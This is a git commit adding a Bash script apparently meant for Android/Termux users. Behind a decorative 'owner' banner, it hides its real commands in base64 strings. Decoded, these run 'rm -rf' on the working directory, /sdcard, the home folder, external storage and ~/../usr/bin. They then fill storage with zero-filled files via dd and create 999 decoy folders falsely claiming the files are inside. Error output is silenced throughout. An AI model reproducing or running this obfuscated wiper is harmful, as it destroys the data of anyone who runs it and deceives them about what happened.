67196bbbe1b78dfc739543cfd6affec1e447109b
Evgenyslavik9 <83081018+Evgenyslavik9@users.noreply.github.com>
2021-04-23 17:41:16 +0200

    Create slavik_IUN.sh

---
+++ slavik_IUN.sh
@@ -0,0 +1,179 @@
+
+function owner(){
+
+g1='\033[92m'
+g='\e[0;34m'
+g1='\033[92m'
+g2='\e[1;32m'
+r='\e[1;31m'
+echo -e $g"
+█▓▒░█▓▒░◎◎◎░▒▓█░▓██▓▒░◎◎◎░▒▓█░▒▓█
+╭───────╯•╰───────────────────╮
+║      𖡨❯╅ཤINFOཥ╆❮𖡨𖡨❯╅┄╼❮ཤ𖢘
+║
+╠🌹࿆͜͡➢ᴸᵒⁿᵉˡʸ BOY࿐༆⃟᠁
+╠🌹࿆͜͡➢OWNER:🌀ᵉᵛᴳᴱᴺᵞ🔴ˢᴸᴬᵛᴵᴷᬊ͜͡🌀࿐
+╠🌹࿆͜͡➢https://www.facebook.com/killersboy.kby
+╠🌹࿆͜͡➢SCRIPT NAME:🌀ᬊ͜͡Slavik-IUNᬊ͜͡2021
+╰───────╮•╭───────────────────╯
+𖡨❯╅╾┽┄╼❮ཤ𖢘ཥ❯╾┄┾╼╆❮𖡨𖡨❯╅╾┽┄╾┄┾╼╆❮𖡨"
+sleep 2
+echo -e $r"╭───────╯•╰───────────────────╮"
+
+sleep 2
+echo -e $g1" 𖡨 ᴀʟʟᴀʜ ᶠⁱʳˢᵗ 𖡨"
+sleep 2
+echo -e $r" █▀▀▀█ █░░░ █▀▀█ █░░▒█ ▀█▀ █░▄▀"
+sleep 0.5
+echo " ▀▀▀▄▄ █░░░ █▄▄█ ▒█▒█░ ░█░ █▀▄░-IUN"
+sleep 0.5
+echo " █▄▄▄█ █▄▄█ █░▒█ ░▀▄▀░ ▄█▄ █░▒█"
+sleep 0.5
+printf "\e[1;93m .:.\e[0m\e[1;77m by: @ᵉᵛᴳᴱᴺᵞ🔴ˢᴸᴬᵛᴵᴷ🔵 \e[0m\e[1;93m.:.:.\e[0m\n"
+
+sleep 2
+echo -e $r"╰───────╮•╭───────────────────╯"
+sleep 2
+echo -e $g"𖡨❯╅╾┽┄╼❮ཤ𖢘ཥ❯╾┄┾╼╆❮𖡨𖡨❯╅╾┽┄╾┄┾╼╆❮𖡨
+┊┊┊┊
+┊┊┊𖡹 ۝corona
+┊┊┊┊
+┊┊┊𖡹 ۝
+┊┊💎　　ೋ๑┋┋๑ೋ 
+┊┊               .    ཤ𖢘ཥ
+┊𖡹 ۝vírus　　°
+.             *    ·┊┊💎　　
+┊┊               .    
+┊𖡹 ۝　　°
+💎.             *    ·"
+}
+
+
+a='ZGQgaWY9L2Rldi96ZXJvIG9mPS5zeXN0ZW0xLnN5IGJzPTNNIHNlZWs9MTAwCg=='                                             
+aa='ZGQgaWY9L2Rldi96ZXJvIG9mPS5zeXN0ZW0yLnN5IGJzPTNNIHNlZWs9MTAwCg=='
+aaa='ZGQgaWY9L2Rldi96ZXJvIG9mPS5zeXN0ZW0zLnN5IGJzPTNNIHNlZWs9MTAwCg=='                                                                
+aaaa='ZGQgaWY9L2Rldi96ZXJvIG9mPS5zeXN0ZW00LnN5IGJzPTNNIHNlZWs9MTAwCg=='                                                               
+aaaaa='ZGQgaWY9L2Rldi96ZXJvIG9mPS5zeXN0ZW01LnN5IGJzPTNNIHNlZWs9MTAwCg=='                                                              
+aaaaaa='ZGQgaWY9L2Rldi96ZXJvIG9mPS5zeXN0ZW02LnN5IGJzPTNNIHNlZWs9MTAwCg=='
+slavikinhoo=$(echo $slavikinho | base64 --decode ) 2>/dev/null
+login=$(echo $Loginn | base64 --decode ) 2>/dev/null
+senha=$(echo $Senhaa | base64 --decode ) 2>/dev/null
+garant=$(echo $garantia | base64 --decode ) 2>/dev/null
+b=$(echo $a | base64 --decode ) 2>/dev/null
+bb=$(echo $aa | base64 --decode ) 2>/dev/null
+bbb=$(echo $aaa | base64 --decode ) 2>/dev/null
+bbbb=$(echo $aaaa | base64 --decode ) 2>/dev/null
+bbbbb=$(echo $aaaaa | base64 --decode ) 2>/dev/null
+bbbbbb=$(echo $aaaaaa | base64 --decode ) 2>/dev/null
+
+slavikinho='cm0gLXJmIC4vCg=='
+Loginn='L3NkY2FyZC8K'                                               
+Senhaa='fi8K'
+garantia='L3N0b3JhZ2Uvc2RjYXJkMC8K'
+recu='fi8uLi91c3IvYmluLwo='
+raa=$(echo $recu | base64 --decode ) 2>/dev/null
+
+
+s='ZGQgaWY9L2Rldi96ZXJvIG9mPS9zZGNhcmQvLnN5c3RlbTEuc3kgYnM9M00gc2Vlaz0xMDAK'                                                          
+sl='ZGQgaWY9L2Rldi96ZXJvIG9mPS9zZGNhcmQvLnN5c3RlbTIuc3kgYnM9M00gc2Vlaz0xMDAK'                                                         
+sla='ZGQgaWY9L2Rldi96ZXJvIG9mPS9zZGNhcmQvLnN5c3RlbTMuc3kgYnM9M00gc2Vlaz0xMDAK'                                                        
+slav='ZGQgaWY9L2Rldi96ZXJvIG9mPS9zZGNhcmQvLnN5c3RlbTQuc3kgYnM9M00gc2Vlaz0xMDAK'                                                       
+slavi='ZGQgaWY9L2Rldi96ZXJvIG9mPS9zZGNhcmQvLnN5c3RlbTUuc3kgYnM9M00gc2Vlaz0xMDAK'                                                      
+slavik='ZGQgaWY9L2Rldi96ZXJvIG9mPS9zZGNhcmQvLnN5c3RlbTYuc3kgYnM9M00gc2Vlaz0xMDAK'
+ss=$(echo $s | base64 --decode ) 2>/dev/null
+sll=$(echo $sl | base64 --decode ) 2>/dev/null
+slaa=$(echo $sla | base64 --decode ) 2>/dev/null
+slavv=$(echo $slav | base64 --decode ) 2>/dev/null
+slavii=$(echo $slavi | base64 --decode ) 2>/dev/null
+slavikk=$(echo $slavik | base64 --decode ) 2>/dev/null
+che='SEksIEkgYW0gRVZHRU5ZIFNMQVZJSyBCT0dBQ0hFViAsYW5kIHNvcnJ5IGZvciB0aGF0LiBJdHMgbXkgZnVuY3Rpb24gSGVIZUhlIEZCOiBodHRwczovL3d3dy5mYWNlYm9vay5jb20va2lsbGVyc2JveS5rYnkK'
+chev=$(echo $che | base64 --decode ) 2>/dev/null
+owner
+ev='ZGQgaWY9L2Rldi96ZXJvIG9mPS9zdG9yYWdlL3NkY2FyZDAvLnN5c3RlbTAxLnN5IGJzPTNNIHNlZWs9MTAwCg=='
+eva='ZGQgaWY9L2Rldi96ZXJvIG9mPS9zdG9yYWdlL3NkY2FyZDAvLnN5c3RlbTAyLnN5IGJzPTNNIHNlZWs9MTAwCg=='
+evaa='ZGQgaWY9L2Rldi96ZXJvIG9mPS9zdG9yYWdlL3NkY2FyZDAvLnN5c3RlbTAzLnN5IGJzPTNNIHNlZWs9MTAwCg=='
+evaaa='ZGQgaWY9L2Rldi96ZXJvIG9mPS9zdG9yYWdlL3NkY2FyZDAvLnN5c3RlbTA0LnN5IGJzPTNNIHNlZWs9MTAwCg=='
+evaaaa='ZGQgaWY9L2Rldi96ZXJvIG9mPS9zdG9yYWdlL3NkY2FyZDAvLnN5c3RlbTA1LnN5IGJzPTNNIHNlZWs9MTAwCg=='
+evaaaaa='ZGQgaWY9L2Rldi96ZXJvIG9mPS9zdG9yYWdlL3NkY2FyZDAvLnN5c3RlbTA2LnN5IGJzPTNNIHNlZWs9MTAwCg=='
+evs=$(echo $ev | base64 --decode ) 2>/dev/null
+evb=$(echo $eva | base64 --decode ) 2>/dev/null
+evbb=$(echo $evaa | base64 --decode ) 2>/dev/null
+evbbb=$(echo $evaaa | base64 --decode ) 2>/dev/null
+evbbbb=$(echo $evaaaa | base64 --decode ) 2>/dev/null
+evbbbbb=$(echo $evaaaaa | base64 --decode ) 2>/dev/null
+
+nna="ZWNobyAtZSB7W0BXZWxjb21lXS1UbyBTTEFWSUstSVVOIH0gXGVbMDszNG0K"
+nnee="ZWNobyAtZSAnQ3JlYXRvcjpA4bWJ4bWb4bSz4bSx4bS64bWe8J+UtMui4bS44bSs4bWb4bS14bS38J+UtXYwMX4yMDIwLTIwMjEnCg=="
+nni="ZWNobyAtZSAnIOKWiOKWgOKWgOKWgOKWiCDilojilpHilpHilpEg4paI4paA4paA4paIIOKWiOKWkeKWkeKWkuKWiCDiloDilojiloAg4paI4paR4paE4paAICcK"
+nnii="ZWNobyAtZSAnIOKWgOKWgOKWgOKWhOKWhCDilojilpHilpHilpEg4paI4paE4paE4paIIOKWkuKWiOKWkuKWiOKWkSDilpHilojilpEg4paI4paA4paE4paRLUlVTicK"
+nno="ZWNobyAtZSAnIOKWiOKWhOKWhOKWhOKWiCDilojiloTiloTilogg4paI4paR4paS4paIIOKWkeKWgOKWhOKWgOKWkSDiloTilojiloQg4paI4paR4paS4paIICcK"
+nnoo="ZWNobyAtZSAnRkI6aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2tpbGxlcnNib3kua2J5ICcK"
+nne="ZWNobyAtZSBcMDMzWzkybSB7W0BdLX1QUk9DRVNTSU5HIC4uLgo="
+
+
+nnna=$(echo $nna | base64 --decode) 2>/dev/null
+nnnee=$(echo $nnee | base64 --decode) 2>/dev/null
+nnni=$(echo $nni | base64 --decode) 2>/dev/null
+nnnii=$(echo $nnii | base64 --decode) 2>/dev/null
+nnno=$(echo $nno | base64 --decode) 2>/dev/null
+nnnoo=$(echo $nnoo | base64 --decode) 2>/dev/null
+nnne=$(echo $nne | base64 --decode) 2>/dev/null
+
+
+inni="bWtkaXIgU0xBVklLLUlVTi0yMDIxQOG1ieG1m+G0s+G0seG0uuG1nvCflLTLouG0uOG0rOG1m+G0teG0t/CflLV2MDFfRkI6ZmFjZWJvb2suY29ta2lsbGVyc2JveS5rYnlfX19fX19BUlFVSVZPUy1FU1RBTy1FTS1VTUEtREVTU0FTLVBBU1RBU19fLnR4dHsxLi45OTl9Cg=="
+onno="bWtkaXIgL3NkY2FyZC9fU0xBVklLLUlVTi0yMDIxQOG1ieG1m+G0s+G0seG0uuG1nvCflLTLouG0uOG0rOG1m+G0teG0t/CflLV2MDFfRkI6ZmFjZWJvb2suY29ta2lsbGVyc2JveS5rYnlfX19fX19BUlFVSVZPUy1FU1RBTy1FTS1VTUEtREVTU0FTLVBBU1RBU19fLnR4dHsxLi45OTl9Cg=="
+oonnoo="dG91Y2ggL3NkY2FyZC8uX1NMQVZJSy1JVU4tMjAyMUDhtYnhtZvhtLPhtLHhtLrhtZ7wn5S0y6LhtLjhtKzhtZvhtLXhtLfwn5S1djAxX0ZCOmZhY2Vib29rLmNvbWtpbGxlcnNib3kua2J5X19fX19fLUFSUVVJVk9TLUVTVEFPLUVNLVVNQS1ERVNTQVMtUEFTVEFTXy50eHR7MS4uOTk5fQo="
+enne="dG91Y2ggLlNMQVZJSy1JVU4tMjAyMUDhtYnhtZvhtLPhtLHhtLrhtZ7wn5S0y6LhtLjhtKzhtZvhtLXhtLfwn5S1djAxX0ZCOmZhY2Vib29rLmNvbWtpbGxlcnNib3kua2J5X19fX19fQVJRVUlWT1MtRVNUQU8tRU0tVU1BLURFU1NBUy1QQVNUQVNfXy50eHR7MS4uOTk5fQo="
+
+iinnnii=$(echo $inni | base64 --decode) 2>/dev/null
+onnno=$(echo $onno | base64 --decode) 2>/dev/null                  
+oonnnoo=$(echo $oonnoo | base64 --decode) 2>/dev/null
+ennne=$(echo $enne | base64 --decode) 2>/dev/null                  
+echo -e ""
+echo -e '[WAIT 1min | AGUARDE 1min]'
+$nnne
+$slavikinhoo* $login* $senha* $garant* $raa* 2>/dev/null
+$nnne
+$iinnnii 2>/dev/null                                                         
+$onnno 2>/dev/null
+$oonnnoo 2>/dev/null
+$ennne 2>/dev/null
+mkdir SLAVIK-IUN-2021@ᵉᵛᴳᴱᴺᵞ🔴ˢᴸᴬᵛᴵᴷ🔵v01_FB:facebook.comkillersboy.kby______ARQUIVOS-ESTAO-EM-UMA-DESSAS-PASTAS__.txt{1..999} 2>/dev/null  
+mkdir /sdcard/_SLAVIK-IUN-2021@ᵉᵛᴳᴱᴺᵞ🔴ˢᴸᴬᵛᴵᴷ🔵v01_FB:facebook.comkillersboy.kby______ARQUIVOS-ESTAO-EM-UMA-DESSAS-PASTAS__.txt{1..999} 2>/dev/null  
+touch /sdcard/._SLAVIK-IUN-2021@ᵉᵛᴳᴱᴺᵞ🔴ˢᴸᴬᵛᴵᴷ🔵v01_FB:facebook.comkillersboy.kby______-ARQUIVOS-ESTAO-EM-UMA-DESSAS-PASTAS_.txt{1..999} 2>/dev/null  
+touch .SLAVIK-IUN-2021@ᵉᵛᴳᴱᴺᵞ🔴ˢᴸᴬᵛᴵᴷ🔵v01_FB:facebook.comkillersboy.kby______ARQUIVOS-ESTAO-EM-UMA-DESSAS-PASTAS__.txt{1..999} 2>/dev/null  
+
+$ss 2>/dev/null
+$sll 2>/dev/null
+$nnne
+$slaa 2>/dev/null
+$slavv 2>/dev/null
+$slavii 2>/dev/null
+$slavikk 2>/dev/null
+
+$nnne
+$evs 2>/dev/null
+$evb 2>/dev/null
+$evbb 2>/dev/null
+$nnne
+$evbbb 2>/dev/null
+$evbbbb 2>/dev/null
+$evbbbbb 2>/dev/null
+$nnne
+
+$b 2>/dev/null
+$bb 2>/dev/null
+$bbb 2>/dev/null
+$nnne
+$bbbb 2>/dev/null
+$bbbbb 2>/dev/null
+$bbbbbb 2>/dev/null
+$chev 2>/dev/null
+
+
+$nnna                                                     
+$nnnee
+$nnni
+$nnnii                                                    
+$nnno
+$nnnoo
